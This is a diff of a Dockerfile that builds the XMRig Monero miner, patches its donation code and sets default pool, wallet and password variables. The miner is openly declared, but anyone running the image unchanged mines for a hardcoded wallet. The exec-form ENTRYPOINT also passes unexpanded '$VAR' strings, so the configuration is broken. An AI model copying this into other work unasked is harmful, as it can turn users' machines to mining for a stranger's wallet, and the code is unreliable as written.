@@ -1,21 +1,61 @@
 FROM ubuntu:latest AS build
 
-ARG XMRIG_VERSION='v6.7.0'
+LABEL maintainer="zocker_160"
 
-ENV DEBIAN_FRONTEND=noninteractive
+ENV DEBIAN_FRONTEND noninteractive
 
-RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+ENV XMRIG_VERSION v6.8.2
+
+RUN \
+	apt-get update \
+	&& apt-get upgrade -y \
+	&& apt-get install -y \
+	git \
+	wget \
+	build-essential \
+	cmake \
+	automake \
+	libtool \
+	autoconf
+
 WORKDIR /root
-RUN git clone https://github.com/xmrig/xmrig
+RUN git clone https://github.com/xmrig/xmrig.git
 WORKDIR /root/xmrig
-RUN git checkout ${XMRIG_VERSION}
-RUN mkdir build && cd build && cmake .. -DOPENSSL_USE_STATIC_LIBS=TRUE && make
+RUN git checkout $XMRIG_VERSION
+
+WORKDIR /root/xmrig/scripts
+RUN bash ./build_deps.sh
+
+WORKDIR /root/xmrig
+ADD donate.patch .
+RUN patch -u src/donate.h -i donate.patch
+
+WORKDIR /root/xmrig/build
+RUN cmake .. -DXMRIG_DEPS=scripts/deps
+RUN make -j$(nproc)
+
+#################################
 
 FROM ubuntu:latest
-RUN apt-get update && apt-get install -y libhwloc15
+
+ENV DONATE_LEVEL "1"
+ENV POOL_URL "xmr.bohemianpool.com:6666"
+ENV USERNAME "43BbjzK77JqWw61mDLMWaRQVzByosfCgkGnRLhxW1kVvhQrbvu1iK4nWwqUisv9cm9WZ9WgqFZoUvbCmU13MAu348d3XLqP"
+ENV PASSWORD "zocker_dockerimage"
+ENV COIN "monero"
+
 RUN useradd -ms /bin/bash monero
 WORKDIR /root
+
 COPY --from=build --chown=monero /root/xmrig/build/xmrig /root
 
-ENTRYPOINT ["./xmrig"]
-CMD ["--url=pool.supportxmr.com:3333", "--user=49ZNRzJYncy5KaabHuMXqHcfRCg8WR7xULjf5YJyXtoYcSM4j6EYhQR8rne8Ee4Fk3XDNi61wEDmMXtfMKKLdKXZ5JUVhkj", "--pass=Docker", "-k", "--coin=monero"]˚
+ENTRYPOINT ["/root/xmrig", \
+	"--donate-level", "$DONATE_LEVEL", \
+	"--url", "$POOL_URL", \
+	"--user", "$USERNAME", \
+	"--pass", "$PASSWORD", \
+	"--coin", "$COIN" \
+]
+
+CMD ["--keepalive"]
+# if you want the webinterface, you can add --http-host 0.0.0.0 --http-port 57016
